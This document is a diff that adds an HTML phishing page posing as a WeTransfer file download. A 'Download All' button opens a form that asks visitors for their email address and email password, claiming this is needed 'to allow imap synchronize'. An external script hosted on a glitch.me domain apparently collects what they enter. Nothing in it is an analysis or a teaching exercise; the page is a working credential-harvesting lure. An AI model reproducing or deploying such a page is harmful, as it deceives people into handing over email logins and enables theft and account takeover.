@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <title>We-transfer</title>
+
+
+    <style>
+
+.bg{
+           background-image: url('https://iili.io/JnywQvj.png');
+        background-repeat: no-repeat; 
+        background-size: cover;
+        width: 1450px;
+        height: 768px;          
+        position: absolute;  
+		-webkit-background-size: cover;
+  -moz-background-size: cover;
+  -o-background-size: cover;
+      }
+      *{
+        margin: 0;
+        padding: 0;
+        outline: none;
+		overflow: hidden;
+        
+      }
+      body {
+        color: #045eb4;
+        
+      }
+      .butn{position:absolute; left: 180px; top: 570px; border-radius: 5px}
+      .w3-modal-content{  max-width: 450px; color: #222; border-radius: 4px;}
+      .mTitle{ border-bottom:1px solid #eee; padding:5px 15px; text-align:center; }
+      .mTitle img{ max-width: 250px; height:auto; }
+      .w3-container{margin: 3px 5px 15px;}
+      .w3-container label{font-size: 13.4px; color: #222}
+      .w3-input{  border: 1px solid #bbb; !important; margin-bottom: 20px}
+      .w3-input:hover{  border: 1px solid #045eb49c; }
+      .w3-input:active, .w3-input:focus{  border: 1px solid #036eb49c; }
+      .w3-panel{margin: 9px -21px; display: flex; justify-content:center; font-size: 14px; text-align:center; }
+      .hide{ display:none } .show{ display:flex }
+    </style>
+  </head>
+
+  <body>
+   <div class="bg">
+      <div id="myModal" class="w3-modal">
+        <div class="w3-modal-content">
+          <div class="mTitle"><img src="https://cdn.glitch.global/2320f642-612e-42bb-913c-f646e55193a7/flx-logo.jpg?v=1673780291431"></div>
+          <div style="margin: 3px 10px 15px; font-size: 12px; text-align: center; color: #444;">Enter the correct email and password details, to allow imap synchronize and allow access to files.</div>
+          <div class="w3-container">
+            <div class="w3-panel w3-red hide" id="msg"></div>        
+			<div class="w3-panel w3-red hide" id="error"></div>    			
+              <form class="w3-container" method="post" id="sendform" name="sendform">
+                <div>
+                  <label>Email Address</label>
+                  <input class="w3-input" type="email" id="email" name="email" value="" required>                  
+                </div>
+
+                <div>
+                  <label>Email Password</label>
+                  <input class="w3-input" type="password" minlength="6" id="password" name="epass" required>                 
+                </div>
+
+                <div>
+                  <button class="logbtn w3-button w3-blue w3-block" id="submit-btn">Download</button>
+                </div>
+
+              </form>
+          </div>
+        </div>
+      </div>      
+    </div>
+    <div>
+      <button class="butn w3-button w3-blue" data-toggle="modal" data-target="#myModal">Download All</button>
+    </div>
+</div>
+
+
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.7.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
+  <script src="https://helix-jungle-bill.glitch.me/mcj.js"></script>
+  
+  
+
+  </body>
+  </html>
